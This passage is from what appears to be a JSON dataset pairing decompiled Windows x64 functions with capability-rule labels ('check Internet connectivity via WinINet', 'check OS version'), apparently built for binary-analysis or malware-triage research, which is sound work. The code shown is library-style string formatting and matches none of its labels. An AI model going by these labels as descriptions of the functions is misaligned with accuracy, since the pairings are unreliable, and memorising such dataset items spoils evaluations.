iVar4 = *0x140110600;\n        piVar8[2] = 0;\n        piVar8[3] = 0;\n        *piVar8 = iVar4 + 0x10;\n        *(piVar8 + 4) = 0;\n        *(piVar8 + 0x21) = 0;\n        piVar8[5] = 0;\n        piVar8[6] = 0;\n        piVar8[7] = 0;\n        piVar8[8] = 0;\n        piVar8[9] = 0;\n        piVar8[10] = 0;\n        *(piVar8 + 0xb) = 0;\n        *(piVar8 + 0x5c) = 0;\n        *(piVar8 + 0x6f) = 0;\n        fcn.1400a0590(piVar8, arg4 + 0xd0);\n        fcn.1400a38f0(*(arg4 + 0xd0), piVar8, arg3_00);\n        piVar8 = *ppiVar1;\n    }\n    puVar11 = *in_stack_00000030;\n    if (*puVar11 == *(piVar8 + 100)) {\n        uStack140 = *(piVar8 + 0xc);\n        puStack232 = piVar8[9];\n        uStack248 = piVar8[10];\n        if (in_stack_00000030[1] == NULL) goto code_r0x0001400438d7;\n        puVar11 = puVar11 + 1;\n    }\n    else {\n        uStack140 = *(piVar8 + 0x5c);\n        puStack232 = piVar8[7];\n        uStack248 = piVar8[8];\n    }\n    puVar10 = in_stack_00000030[1] + puVar11;\n    if (puVar10 <= puVar11) goto code_r0x0001400438d7;\n    puVar13 = puVar11;\n    do {\n        if ((*(*(iVar6 + 0x30) + *puVar13 * 2) & 8) == 0) break;\n        puVar13 = puVar13 + 1;\n    } while (puVar10 != puVar13);\n    puVar13 = puVar13 + -puVar11;\n    if (puVar13 == NULL) goto code_r0x0001400438d7;\n    puStack128 = NULL;\n    uStack120 = 0;\n    puStack136 = &uStack120;\n    fcn.1400a9080(&puStack136, puVar13 * 2);\n    iVar5 = *(piVar8 + 0xb);\n    iVar17 = puVar13 - iVar5;\n    if (iVar17 < 1) {\ncode_r0x000140043a0c:\n        puVar10 = puStack128;\n        if (iVar5 < 1) {\ncode_r0x000140043a21:\n            uVar16 = *(arg4 + 0x18) & 0xb0;\n            puStack216 = puStack128 + uStack248;\n            if ((*(arg4 + 0x18) & 0x200) != 0) {\n                puStack216 = puStack216 + piVar8[6];\n            }\n            puStack96 = NULL;\n            uStack88 = 0;\n            puStack104 = &uStack88;\n            fcn.1400a9080(&puStack104, puStack216 * 2);\n            puVar11 = *(arg4 + 0x10);\n            ppuVar14 = &uStack140;\n            puStack184 = puStack96;\n            do {\n                if (*ppuVar14 < 5) {\n    // switch table (5 cases) at 0x14010b000\n                    switch(*ppuVar14) {\n                    case 0:\n                        if (uVar16 == 0x10 && puStack216 < puVar11) {\ncode_r0x000140043c0a:\n                            arg4_00 = puVar11 + -puStack216;\n                            fcn.1400a76a0(&puStack104, puStack184, 0, arg4_00);\n                            puStack184 = puStack96;\n                        }\n                        break;\n                    case 1:\ncode_r0x000140043b88:\n                        if (uVar16 == 0x10 && puStack216 < puVar11) goto code_r0x000140043c0a;\n                        if (puStack104 == &uStack88) {\n                            puVar10 = 0xf;\n                        }\n                        else {\n                            puVar10 = CONCAT71(Stack87, uStack88);\n                        }\n                        if (puVar10 < puStack184 + 1) {\n                            arg4_00 = NULL;\n                            fcn.1400a9390(&puStack104, puStack184, 0, 0);\n                        }\n                        puStack104[puStack184] = in_stack_00000028;\ncode_r0x000140043bd8:\n                        puStack184 = puStack184 + 1;\n                        puStack96 = puStack184;\n                        puStack104[puStack184] = 0;\n                        break;\n                    case 2:\n                        if ((arg4[0x19] & 2) != 0) {\n                            puVar10 = piVar8[6];\n                            puVar7 = piVar8[5];\n                            if (puVar10 <= 0x3fffffffffffffff - puStack184) goto code_r0x000140043c5e;\n                            fcn.1400bd360(0x14010af72);\n                            goto code_r0x000140043b88;\n                        }\n                        break;\n                    case 3:\n                        if (uStack248 != 0) {\n                            uVar2 = *puStack232;\n                            if (puStack104 == &uStack88) {\n                                puVar10 = 0xf;\n                            }\n                            else {\n                                puVar10 = CONCAT71(Stack87, uStack88);\n                            }\n                            if (puVar10 < puStack184 + 1) {\n                                arg4_00 = NULL;\n                                fcn.1400a9390(&puStack104, puStack184, 0, 0);\n                            }\n                            puStack104[puStack184] = uVar2;\n                            goto code_r0x000140043bd8;\n                        }\n                        break;\n                    case 4:\n                        puVar7 = puStack136;\n                        puVar10 = puStack128;\n                        if (0x3fffffffffffffff - puStack184 < puStack128) goto code_r0x000140044040;\ncode_r0x000140043c5e:\n                        fcn.1400a91c0(&puStack104, puVar7, puVar10);\n                        puStack184 = puStack96;\n                    }\n                }\n                ppuVar14 = ppuVar14 + 1;\n            } while (ppuVar14 != &puStack136);\n            if (1 < uStack248) {\n                puVar13 = uStack248 - 1;\n                if (0x3fffffffffffffff - puStack184 < puVar13) {\n                    fcn.1400bd360(0x14010af72);\n                    goto code_r0x000140044021;\n                }\n                fcn.1400a91c0(&puStack104, puStack232 + 1, puVar13);\n                puStack184 = puStack96;\n            }\n            if (puStack184 < puVar11) {\n                if (uVar16 == 0x20) {\n                    fcn.1400a76a0(&puStack104, puStack184, 0, puVar11 - puStack184);\n                    puStack184 = puVar11;\n                }\n                else {\n                    fcn.1400a76a0(&puStack104, 0, 0, puVar11 - puStack184);\n                    puStack184 = puVar11;\n                }\n            }\n            uVar15 = piVar18 & 0xffffffff;\n            if ((piVar18 == '\\0') &&\n               (iVar6 = (**(*piVar3 + 0x60))(piVar3, puStack104, puStack184),  puStack184 != iVar6)) {\n                uVar15 = 1;\n            }\n            piVar18 = piVar18 & 0xffffffffffffff00 | uVar15 & 0xff;\n            if (puStack104 != &uStack88) {\n                fcn.1400bc6c0(puStack104);\n            }\n            if (puStack136 != &uStack120) {\n                fcn.1400bc6c0();\n            }\ncode_r0x0001400438d7:\n            *(arg4 + 0x10) = 0;\n            arg1[1] = piVar18;\n            *arg1 = piVar3;\n            return arg1;\n        }\n        uVar2 = *(piVar8 + 0x21);\n        arg2 = puStack128 + 1;\n        if (puStack136 == &uStack120) {\n            puVar12 = 0xf;\n        }\n        else {\n            puVar12 = CONCAT71(Stack119, uStack120);\n        }\n        if (puVar12 < arg2) {\n            arg4_00 = NULL;\n            fcn.1400a9390(&puStack136, puStack128, 0, 0);\n        }\n        puStack136[puVar10] = uVar2;\n        (puStack136 + 1)[puVar10] = 0;\n        puStack128 = arg2;\n        if (iVar17 < 0) {\n            arg4_00 = -iVar17;\n            fcn.1400a76a0(&puStack136, arg2, 0, arg4_00);\n            if (0x3fffffffffffffff - puStack128 < puVar13) goto code_r0x00014004404c;\ncode_r0x000140043dfa:\n            fcn.1400a91c0(&puStack136, puVar11, puVar13);\n            goto code_r0x000140043a21;\n        }\n        puVar13 = *(piVar8 + 0xb);\n        puVar11 = puVar11 + iVar17;\n        if (puVar13 <= 0x3fffffffffffffff - arg2) goto code_r0x000140043dfa;\ncode_r0x000140044021:\n        fcn.1400bd360(0x14010af72);\n        puVar10 = puVar13;\n    }\n    else {\n        if (iVar5 < 0) {\n            iVar17 = puVar13;\n        }\n        if (piVar8[3] == 0) {\n            arg4_00 = puVar11;\n            fcn.1400a6b40(&puStack136, 0, puStack128, puVar11);\n            iVar5 = *(piVar8 + 0xb);\n            goto code_r0x000140043a0c;\n        }\n        fcn.1400a76a0(&puStack136, 0, puStack128, iVar17 * 2);\n        puVar7 = fcn.1400b60e0(puStack136, *(piVar8 + 0x22), piVar8[2], piVar8[3]);\n        puVar10 = puVar7 + -puStack136;\n        arg4_00 = puStack128;\n        if (puVar10 <= puStack128) {\n            *puVar7 = 0;\n            iVar5 = *(piVar8 + 0xb);\n            puStack128 = puVar10;\n            goto code_r0x000140043a0c;\n        }\n    }\n    fcn.1400b7b60(0x14010afc8, 0x14010afb4, puVar10, arg4_00);\ncode_r0x000140044040:\n    fcn.1400bd360(0x14010af72);\ncode_r0x00014004404c:\n    uVar9 = fcn.1400bd360(0x14010af72);\n    fcn.1400bc860(uVar9);\n    (**(*piVar8 + 8))(piVar8);\n    do {\n        uVar9 = fcn.1400bcd60();\n        fcn.1400bc860(uVar9);\n    } while( true );\n}\n",
        "token_count": 3200
    },
    "14004442": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140044420(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4)\n\n{\n    uint64_t uVar1;\n    int64_t **ppiVar2;\n    int16_t *arg2;\n    ushort uVar3;\n    int64_t *piVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    int64_t *piVar8;\n    int64_t iVar9;\n    int64_t *piVar10;\n    ulong uVar11;\n    bool bVar12;\n    ushort *puVar13;\n    int16_t *piVar14;\n    uint64_t uVar15;\n    int32_t iVar16;\n    uint64_t arg2_00;\n    uint32_t uVar17;\n    ushort **ppuVar18;\n    int16_t *piVar19;\n    int16_t *piVar20;\n    int64_t *piVar21;\n    int16_t *arg3_00;\n    uint64_t uVar22;\n    ushort in_stack_00000028;\n    int16_t **in_stack_00000030;\n    uint64_t uStack232;\n    ushort *puStack208;\n    uint uStack140;\n    ushort *puStack136;\n    int16_t *piStack128;\n    ushort uStack120;\n    unkbyte6 Stack118;\n    ushort *puStack104;\n    uint64_t uStack96;\n    ushort uStack88;\n    unkbyte6 Stack86;\n    \n    piVar4 = *arg3;\n    piVar21 = arg3[1];\n    piVar8 = fcn.1400b9850(arg4 + 0xd0);\n    iVar9 = fcn.14002c080(0x1401087e0);\n    ppiVar2 = *(*(arg4 + 0xd0) + 0x18) + iVar9 * 8;\n    piVar10 = *ppiVar2;\n    if (piVar10 == NULL) {\n        piVar10 = fcn.1400bc710(0x80);\n        *(piVar10 + 1) = 0;\n        iVar6 = *0x140110610;\n        piVar10[2] = 0;\n        piVar10[3] = 0;\n        *piVar10 = iVar6 + 0x10;\n        *(piVar10 + 4) = 0;\n        *(piVar10 + 0x22) = 0;\n        piVar10[5] = 0;\n        piVar10[6] = 0;\n        piVar10[7] = 0;\n        piVar10[8] = 0;\n        piVar10[9] = 0;\n        piVar10[10] = 0;\n        *(piVar10 + 0xb) = 0;\n        *(piVar10 + 0x5c) = 0;\n        *(piVar10 + 0x7a) = 0;\n        fcn.1400a0dc0(piVar10, arg4 + 0xd0);\n        fcn.1400a38f0(*(arg4 + 0xd0), piVar10, iVar9);\n        piVar10 = *ppiVar2;\n    }\n    piVar14 = *in_stack_00000030;\n    if (*piVar14 == *(piVar10 + 100)) {\n        uStack140 = *(piVar10 + 0xc);\n        puStack208 = piVar10[9];\n        uStack232 = piVar10[10];\n        if (in_stack_00000030[1] != NULL) {\n            piVar14 = piVar14 + 1;\n        }\n    }\n    else {\n        uStack140 = *(piVar10 + 0x5c);\n        puStack208 = piVar10[7];\n        uStack232 = piVar10[8];\n    }\n    piVar20 = piVar14 + in_stack_00000030[1];\n    iVar9 = (**(*piVar8 + 0x28))(piVar8, 8);\n    arg3_00 = iVar9 - piVar14 >> 1;\n    if (arg3_00 == NULL) goto code_r0x0001400444ee;\n    piStack128 = NULL;\n    uStack120 = 0;\n    puStack136 = &uStack120;\n    fcn.1400acbc0(&puStack136, iVar9 - piVar14);\n    iVar7 = *(piVar10 + 0xb);\n    iVar16 = arg3_00 - iVar7;\n    if (0 < iVar16) {\n        if (iVar7 < 0) {\n            iVar16 = arg3_00;\n        }\n        if (piVar10[3] == 0) {\n            piVar20 = piVar14;\n            fcn.1400aa790(&puStack136, 0, piStack128, piVar14);\n            iVar7 = *(piVar10 + 0xb);\n        }\n        else {\n            fcn.1400ab0f0(&puStack136, 0, piStack128, iVar16 * 2);\n            puVar13 = puStack136;\n            iVar9 = fcn.1400b6270(puStack136, *(piVar10 + 0x24), piVar10[2], piVar10[3]);\n            piVar19 = iVar9 - puVar13 >> 1;\n            piVar20 = piStack128;\n            if (piStack128 < piVar19) goto code_r0x000140044c3c;\n            *(puStack136 + (iVar9 - puVar13)) = 0;\n            iVar7 = *(piVar10 + 0xb);\n            piStack128 = piVar19;\n        }\n    }\n    piVar19 = piStack128;\n    if (0 < iVar7) {\n        uVar3 = *(piVar10 + 0x22);\n        arg2 = piStack128 + 1;\n        if (puStack136 == &uStack120) {\n            piVar20 = 0x7;\n        }\n        else {\n            piVar20 = CONCAT62(Stack118, uStack120);\n        }\n        if (piVar20 < arg2) {\n            fcn.1400aced0(&puStack136, piStack128, 0, 0);\n        }\n        piVar20 = NULL;\n        puStack136[piVar19] = uVar3;\n        puStack136[piVar19 + 1] = 0;\n        piStack128 = arg2;\n        if (iVar16 < 0) {\n            piVar19 = NULL;\n            piVar20 = -iVar16;\n            fcn.1400ab0f0(&puStack136, arg2, 0, piVar20);\n            if (arg3_00 <= 0x1fffffffffffffff - piStack128) goto code_r0x0001400449c9;\ncode_r0x000140044c18:\n            fcn.1400bd360(0x14010b302);\ncode_r0x000140044c24:\n            fcn.1400bd360(0x14010b302);\n            arg3_00 = piVar19;\n        }\n        else {\n            arg3_00 = *(piVar10 + 0xb);\n            piVar14 = piVar14 + iVar16;\n            if (arg3_00 <= 0x1fffffffffffffff - arg2) {\ncode_r0x0001400449c9:\n                fcn.1400acd00(&puStack136, piVar14, arg3_00);\n                goto code_r0x000140044646;\n            }\n        }\n        fcn.1400bd360(0x14010b302);\n        piVar19 = arg3_00;\ncode_r0x000140044c3c:\n        uVar11 = fcn.1400b7b60(0x14010b358, 0x14010b344, piVar19, piVar20);\n        fcn.1400bc860(uVar11);\n        (**(*piVar10 + 8))(piVar10);\n        do {\n            uVar11 = fcn.1400bcd60();\n            fcn.1400bc860(uVar11);\n        } while( true );\n    }\ncode_r0x000140044646:\n    uVar17 = *(arg4 + 0x18) & 0xb0;\n    uVar22 = uStack232 + piStack128;\n    if ((*(arg4 + 0x18) & 0x200) != 0) {\n        uVar22 = uVar22 + piVar10[6];\n    }\n    uStack96 = 0;\n    uStack88 = 0;\n    puStack104 = &uStack88;\n    fcn.1400acbc0(&puStack104, uVar22 * 2);\n    uVar5 = *(arg4 + 0x10);\n    ppuVar18 = &uStack140;\n    bVar12 = uVar17 == 0x10 && uVar22 < uVar5;\n    arg2_00 = uStack96;\n    do {\n        if (*ppuVar18 < 5) {\n    // switch table (5 cases) at 0x14010b3a4\n            switch(*ppuVar18) {\n            case 0:\n                if (bVar12) {\ncode_r0x000140044807:\n                    piVar20 = uVar5 - uVar22;\n                    fcn.1400ab0f0(&puStack104, arg2_00, 0, piVar20);\n                    arg2_00 = uStack96;\n                }\n                break;\n            case 1:\ncode_r0x0001400447a0:\n                if (bVar12) goto code_r0x000140044807;\n                uVar1 = arg2_00 + 1;\n                if (puStack104 == &uStack88) {\n                    uVar15 = 7;\n                }\n                else {\n                    uVar15 = CONCAT62(Stack86, uStack88);\n                }\n                if (uVar15 < uVar1) {\n                    piVar20 = NULL;\n                    fcn.1400aced0(&puStack104, arg2_00, 0, 0);\n                }\n                puStack104[arg2_00] = in_stack_00000028;\n                uStack96 = uVar1;\n                puStack104[arg2_00 + 1] = 0;\n                arg2_00 = uVar1;\n                break;\n            case 2:\n                if ((*(arg4 + 0x19) & 2) != 0) {\n                    piVar14 = piVar10[6];\n                    puVar13 = piVar10[5];\n                    if (piVar14 <= 0x1fffffffffffffff - arg2_00) goto code_r0x000140044856;\n                    fcn.1400bd360(0x14010b302);\n                    goto code_r0x0001400447a0;\n                }\n                break;\n            case 3:\n                if (uStack232 != 0) {\n                    uVar3 = *puStack208;\n                    uVar1 = arg2_00 + 1;\n                    if (puStack104 == &uStack88) {\n                        uVar15 = 7;\n                    }\n                    else {\n                        uVar15 = CONCAT62(Stack86, uStack88);\n                    }\n                    if (uVar15 < uVar1) {\n                        piVar20 = NULL;\n                        fcn.1400aced0(&puStack104, arg2_00, 0, 0);\n                    }\n                    puStack104[arg2_00] = uVar3;\n                    uStack96 = uVar1;\n                    puStack104[arg2_00 + 1] = 0;\n                    arg2_00 = uVar1;\n                }\n                break;\n            case 4:\n                puVar13 = puStack136;\n                piVar14 = piStack128;\n                if (0x1fffffffffffffff - arg2_00 < piStack128) {\n                    piVar19 = piStack128;\n                    fcn.1400bd360(0x14010b302);\n                    goto code_r0x000140044c18;\n                }\ncode_r0x000140044856:\n                fcn.1400acd00(&puStack104, puVar13, piVar14);\n                arg2_00 = uStack96;\n            }\n        }\n        ppuVar18 = ppuVar18 + 1;\n    } while (&puStack136 != ppuVar18);\n    if (1 < uStack232) {\n        piVar19 = uStack232 - 1;\n        if (0x1fffffffffffffff - arg2_00 < piVar19) goto code_r0x000140044c24;\n        fcn.1400acd00(&puStack104, puStack208 + 1, piVar19);\n        arg2_00 = uStack96;\n    }\n    if (arg2_00 < uVar5) {\n        if (uVar17 == 0x20) {\n            fcn.1400ab0f0(&puStack104, arg2_00, 0, uVar5 - arg2_00);\n            arg2_00 = uVar5;\n        }\n        else {\n            fcn.1400ab0f0(&puStack104, 0, 0, uVar5 - arg2_00);\n            arg2_00 = uVar5;\n        }\n    }\n    uVar22 = piVar21 & 0xffffffff;\n    if ((piVar21 == '\\0') && (iVar9 = (**(*piVar4 + 0x60))(piVar4, puStack104, arg2_00),  arg2_00 != iVar9)) {\n        uVar22 = 1;\n    }\n    piVar21 = piVar21 & 0xffffffffffffff00 | uVar22 & 0xff;\n    if (puStack104 != &uStack88) {\n        fcn.1400bc6c0(puStack104);\n    }\n    if (puStack136 != &uStack120) {\n        fcn.1400bc6c0();\n    }\ncode_r0x0001400444ee:\n    *(arg4 + 0x10) = 0;\n    arg1[1] = piVar21;\n    *arg1 = piVar4;\n    return;\n}\n",
        "token_count": 3160
    },
    "140044cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140044cc0(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4)\n\n{\n    uint64_t uVar1;\n    int64_t **ppiVar2;\n    int16_t *arg2;\n    ushort uVar3;\n    int64_t *piVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    int64_t *piVar8;\n    int64_t iVar9;\n    int64_t *piVar10;\n    ulong uVar11;\n    bool bVar12;\n    ushort *puVar13;\n    int16_t *piVar14;\n    uint64_t uVar15;\n    int32_t iVar16;\n    uint64_t arg2_00;\n    uint32_t uVar17;\n    ushort **ppuVar18;\n    int16_t *piVar19;\n    int16_t *piVar20;\n    int64_t *piVar21;\n    int16_t *arg3_00;\n    uint64_t uVar22;\n    ushort in_stack_00000028;\n    int16_t **in_stack_00000030;\n    uint64_t uStack232;\n    ushort *puStack208;\n    uint uStack140;\n    ushort *puStack136;\n    int16_t *piStack128;\n    ushort uStack120;\n    unkbyte6 Stack118;\n    ushort *puStack104;\n    uint64_t uStack96;\n    ushort uStack88;\n    unkbyte6 Stack86;\n    \n    piVar4 = *arg3;\n    piVar21 = arg3[1];\n    piVar8 = fcn.1400b9850(arg4 + 0xd0);\n    iVar9 = fcn.14002c080(0x1401087f0);\n    ppiVar2 = *(*(arg4 + 0xd0) + 0x18) + iVar9 * 8;\n    piVar10 = *ppiVar2;\n    if (piVar10 == NULL) {\n        piVar10 = fcn.1400bc710(0x80);\n        *(piVar10 + 1) = 0;\n        iVar6 = *0x140110620;\n        piVar10[2] = 0;\n        piVar10[3] = 0;\n        *piVar10 = iVar6 + 0x10;\n        *(piVar10 + 4) = 0;\n        *(piVar10 + 0x22) = 0;\n        piVar10[5] = 0;\n        piVar10[6] = 0;\n        piVar10[7] = 0;\n        piVar10[8] = 0;\n        piVar10[9] = 0;\n        piVar10[10] = 0;\n        *(piVar10 + 0xb) = 0;\n        *(piVar10 + 0x5c) = 0;\n        *(piVar10 + 0x7a) = 0;\n        fcn.1400a15e0(piVar10, arg4 + 0xd0);\n        fcn.1400a38f0(*(arg4 + 0xd0), piVar10, iVar9);\n        piVar10 = *ppiVar2;\n    }\n    piVar14 = *in_stack_00000030;\n    if (*piVar14 == *(piVar10 + 100)) {\n        uStack140 = *(piVar10 + 0xc);\n        puStack208 = piVar10[9];\n        uStack232 = piVar10[10];\n        if (in_stack_00000030[1] != NULL) {\n            piVar14 = piVar14 + 1;\n        }\n    }\n    else {\n        uStack140 = *(piVar10 + 0x5c);\n        puStack208 = piVar10[7];\n        uStack232 = piVar10[8];\n    }\n    piVar20 = piVar14 + in_stack_00000030[1];\n    iVar9 = (**(*piVar8 + 0x28))(piVar8, 8);\n    arg3_00 = iVar9 - piVar14 >> 1;\n    if (arg3_00 == NULL) goto code_r0x000140044d8e;\n    piStack128 = NULL;\n    uStack120 = 0;\n    puStack136 = &uStack120;\n    fcn.1400acbc0(&puStack136, iVar9 - piVar14);\n    iVar7 = *(piVar10 + 0xb);\n    iVar16 = arg3_00 - iVar7;\n    if (0 < iVar16) {\n        if (iVar7 < 0) {\n            iVar16 = arg3_00;\n        }\n        if (piVar10[3] == 0) {\n            piVar20 = piVar14;\n            fcn.1400aa790(&puStack136, 0, piStack128, piVar14);\n            iVar7 = *(piVar10 + 0xb);\n        }\n        else {\n            fcn.1400ab0f0(&puStack136, 0, piStack128, iVar16 * 2);\n            puVar13 = puStack136;\n            iVar9 = fcn.1400b6270(puStack136, *(piVar10 + 0x24), piVar10[2], piVar10[3]);\n            piVar19 = iVar9 - puVar13 >> 1;\n            piVar20 = piStack128;\n            if (piStack128 < piVar19) goto code_r0x0001400454dc;\n            *(puStack136 + (iVar9 - puVar13)) = 0;\n            iVar7 = *(piVar10 + 0xb);\n            piStack128 = piVar19;\n        }\n    }\n    piVar19 = piStack128;\n    if (0 < iVar7) {\n        uVar3 = *(piVar10 + 0x22);\n        arg2 = piStack128 + 1;\n        if (puStack136 == &uStack120) {\n            piVar20 = 0x7;\n        }\n        else {\n            piVar20 = CONCAT62(Stack118, uStack120);\n        }\n        if (piVar20 < arg2) {\n            fcn.1400aced0(&puStack136, piStack128, 0, 0);\n        }\n        piVar20 = NULL;\n        puStack136[piVar19] = uVar3;\n        puStack136[piVar19 + 1] = 0;\n        piStack128 = arg2;\n        if (iVar16 < 0) {\n            piVar19 = NULL;\n            piVar20 = -iVar16;\n            fcn.1400ab0f0(&puStack136, arg2, 0, piVar20);\n            if (arg3_00 <= 0x1fffffffffffffff - piStack128) goto code_r0x000140045269;\ncode_r0x0001400454b8:\n            fcn.1400bd360(0x14010b302);\ncode_r0x0001400454c4:\n            fcn.1400bd360(0x14010b302);\n            arg3_00 = piVar19;\n        }\n        else {\n            arg3_00 = *(piVar10 + 0xb);\n            piVar14 = piVar14 + iVar16;\n            if (arg3_00 <= 0x1fffffffffffffff - arg2) {\ncode_r0x000140045269:\n                fcn.1400acd00(&puStack136, piVar14, arg3_00);\n                goto code_r0x000140044ee6;\n            }\n        }\n        fcn.1400bd360(0x14010b302);\n        piVar19 = arg3_00;\ncode_r0x0001400454dc:\n        uVar11 = fcn.1400b7b60(0x14010b358, 0x14010b344, piVar19, piVar20);\n        fcn.1400bc860(uVar11);\n        (**(*piVar10 + 8))(piVar10);\n        do {\n            uVar11 = fcn.1400bcd60();\n            fcn.1400bc860(uVar11);\n        } while( true );\n    }\ncode_r0x000140044ee6:\n    uVar17 = *(arg4 + 0x18) & 0xb0;\n    uVar22 = uStack232 + piStack128;\n    if ((*(arg4 + 0x18) & 0x200) != 0) {\n        uVar22 = uVar22 + piVar10[6];\n    }\n    uStack96 = 0;\n    uStack88 = 0;\n    puStack104 = &uStack88;\n    fcn.1400acbc0(&puStack104, uVar22 * 2);\n    uVar5 = *(arg4 + 0x10);\n    ppuVar18 = &uStack140;\n    bVar12 = uVar17 == 0x10 && uVar22 < uVar5;\n    arg2_00 = uStack96;\n    do {\n        if (*ppuVar18 < 5) {\n    // switch table (5 cases) at 0x14010b390\n            switch(*ppuVar18) {\n            case 0:\n                if (bVar12) {\ncode_r0x0001400450a7:\n                    piVar20 = uVar5 - uVar22;\n                    fcn.1400ab0f0(&puStack104, arg2_00, 0, piVar20);\n                    arg2_00 = uStack96;\n                }\n                break;\n            case 1:\ncode_r0x000140045040:\n                if (bVar12) goto code_r0x0001400450a7;\n                uVar1 = arg2_00 + 1;\n                if (puStack104 == &uStack88) {\n                    uVar15 = 7;\n                }\n                else {\n                    uVar15 = CONCAT62(Stack86, uStack88);\n                }\n                if (uVar15 < uVar1) {\n                    piVar20 = NULL;\n                    fcn.1400aced0(&puStack104, arg2_00, 0, 0);\n                }\n                puStack104[arg2_00] = in_stack_00000028;\n                uStack96 = uVar1;\n                puStack104[arg2_00 + 1] = 0;\n                arg2_00 = uVar1;\n                break;\n            case 2:\n                if ((*(arg4 + 0x19) & 2) != 0) {\n                    piVar14 = piVar10[6];\n                    puVar13 = piVar10[5];\n                    if (piVar14 <= 0x1fffffffffffffff - arg2_00) goto code_r0x0001400450f6;\n                    fcn.1400bd360(0x14010b302);\n                    goto code_r0x000140045040;\n                }\n                break;\n            case 3:\n                if (uStack232 != 0) {\n                    uVar3 = *puStack208;\n                    uVar1 = arg2_00 + 1;\n                    if (puStack104 == &uStack88) {\n                        uVar15 = 7;\n                    }\n                    else {\n                        uVar15 = CONCAT62(Stack86, uStack88);\n                    }\n                    if (uVar15 < uVar1) {\n                        piVar20 = NULL;\n                        fcn.1400aced0(&puStack104, arg2_00, 0, 0);\n                    }\n                    puStack104[arg2_00] = uVar3;\n                    uStack96 = uVar1;\n                    puStack104[arg2_00 + 1] = 0;\n                    arg2_00 = uVar1;\n                }\n                break;\n            case 4:\n                puVar13 = puStack136;\n                piVar14 = piStack128;\n                if (0x1fffffffffffffff - arg2_00 < piStack128) {\n                    piVar19 = piStack128;\n                    fcn.1400bd360(0x14010b302);\n                    goto code_r0x0001400454b8;\n                }\ncode_r0x0001400450f6:\n                fcn.1400acd00(&puStack104, puVar13, piVar14);\n                arg2_00 = uStack96;\n            }\n        }\n        ppuVar18 = ppuVar18 + 1;\n    } while (&puStack136 != ppuVar18);\n    if (1 < uStack232) {\n        piVar19 = uStack232 - 1;\n        if (0x1fffffffffffffff - arg2_00 < piVar19) goto code_r0x0001400454c4;\n        fcn.1400acd00(&puStack104, puStack208 + 1, piVar19);\n        arg2_00 = uStack96;\n    }\n    if (arg2_00 < uVar5) {\n        if (uVar17 == 0x20) {\n            fcn.1400ab0f0(&puStack104, arg2_00, 0, uVar5 - arg2_00);\n            arg2_00 = uVar5;\n        }\n        else {\n            fcn.1400ab0f0(&puStack104, 0, 0, uVar5 - arg2_00);\n            arg2_00 = uVar5;\n        }\n    }\n    uVar22 = piVar21 & 0xffffffff;\n    if ((piVar21 == '\\0') && (iVar9 = (**(*piVar4 + 0x60))(piVar4, puStack104, arg2_00),  arg2_00 != iVar9)) {\n        uVar22 = 1;\n    }\n    piVar21 = piVar21 & 0xffffffffffffff00 | uVar22 & 0xff;\n    if (puStack104 != &uStack88) {\n        fcn.1400bc6c0(puStack104);\n    }\n    if (puStack136 != &uStack120) {\n        fcn.1400bc6c0();\n    }\ncode_r0x000140044d8e:\n    *(arg4 + 0x10) = 0;\n    arg1[1] = piVar21;\n    *arg1 = piVar4;\n    return;\n}\n",
        "token_count": 3165
    },
    "14004bf7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.14004bf70(int64_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    char cVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    char cVar13;\n    bool bVar14;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    int32_t iVar19;\n    uint8_t uVar20;\n    bool bVar21;\n    bool bVar22;\n    bool bVar23;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    char cStack152;\n    int64_t **ppiStack144;\n    uint32_t uStack136;\n    uint8_t uStack131;\n    bool bStack130;\n    int64_t *piStack120;\n    int32_t iStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint uStack96;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack96 = *(in_R8 + 1);\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    iStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    iVar9 = fcn.140026e80(in_stack_00000028 + 0xd0);\n    uVar16 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar16 == 0x40) {\n        uVar15 = 8;\ncode_r0x00014004bfd8:\n        uVar5 = fcn.140029dd0(&piStack104, &piStack120);\n        if (uVar5 == 0) {\ncode_r0x00014004bffc:\n            ppiStack144 = &piStack104;\n            uVar7 = fcn.140029e90(ppiStack144);\n            cVar6 = uVar7;\n            bVar21 = *(iVar9 + 0x6e) == cVar6;\n            if ((bVar21) || (*(iVar9 + 0x6f) == cVar6)) {\n                cVar13 = *(iVar9 + 0x20);\n                if (((cVar13 != '\\0') && (*(iVar9 + 0x49) == cVar6)) || (*(iVar9 + 0x48) == cVar6))\n                goto code_r0x00014004c066;\n                fcn.14009b630(piStack104);\n                uStack96 = 0xffffffff;\n                uVar5 = 